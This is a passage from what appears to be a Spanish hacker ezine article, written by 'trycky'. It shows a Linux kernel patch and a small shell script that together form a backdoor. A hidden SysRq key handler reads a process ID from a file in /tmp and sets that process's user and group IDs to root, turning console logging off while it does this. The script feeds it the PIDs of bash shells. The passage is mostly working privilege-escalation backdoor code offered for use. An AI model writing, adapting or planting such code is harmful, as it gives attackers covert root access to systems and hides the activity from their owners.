+>   int cont,i;
+>   char buffer[8],*buf;
+>   struct file *filp;
+>   __u32 old_limit = current->addr_limit.seg;
+>
+>   filp=filp_open(MAGIC_PID,O_RDONLY,O_RDONLY);
+>
+>   if(IS_ERR(filp) || filp==NULL){
+>     printk("psys : Error al intentar abrir el fichero => %s\n",MAGIC_PID);
+>     return -1;
+>   }
+>
+>   if(filp->f_op->read==NULL){
+>     fput(filp);
+>     printk("psys : Error leyendo => %s\n",MAGIC_PID);
+>     return -3;
+>   }
+>
+>
+>   filp->f_pos=0;
+>   current->addr_limit.seg = 0xffffffff;
+>   cont=filp->f_op->read(filp,buffer,8,&filp->f_pos);
+>   current->addr_limit.seg = old_limit;
+>   fput(filp);
+>
+>   buf=buffer;
+>
+>   for(i=0 ; buf[i] && i<9 ; i++){
+>     if (buf[i]=='\n' || buf[i]=='\r') {
+>       buf[i]=0;
+>       break;
+>     }
+>   }
+>
+>   pid=myatoi(buf);
+>
+>   printk("psys : Marcandose un detallito con la pid => [%d]\n",pid);
+>   console_loglevel=0;
+>
+>   /* Damos uid=0 a la pid seleccionada */
+>
+>   struct task_struct *psys;
+>
+>   read_lock(&tasklist_lock);
+>   psys=find_task_struct_by_pid(pid);
+>   read_unlock(&tasklist_lock);
+>
+>   if(psys){
+>   psys->uid=0;
+>   psys->euid=0;
+>   psys->gid=0;
+>   psys->egid=0;
+>   } else {
+>     printk("psys : [%d] Pid no valida\n",pid);
+>     return 0;
+>   }
+>   console_loglevel=7;
+> }
+>
+> static struct sysrq_key_op sysrq_psys_op = {
+>   handler: sysrq_handle_psys,
+>   help_msg: "hax0rDsh3ll",
+>   action_msg: "hax0ring"
+> };
+357c452
+< /* d */       NULL,
+---
+> /* d */       &sysrq_psys_op,
+<-->
+
+<++> 7a69Soft/psys.sh
+#! /bin/sh
+# Script pa los que no sepan usar ps y cat xD
+MAGIC_PID=/tmp/7a69rl0z
+ps|grep bash  |awk '{print $1}' > $MAGIC_PID
+echo -ne "trycky dice OAA OAA llama al sysrq.\n"
+<-->
+
+trycky@7a69ezine.org
+
+Thnx a Ripe y ziskxo y ya veremos que futuras versiones del mismo publicamos.
+
+-------------------------------------------------------------------------------
+
+*EOF*
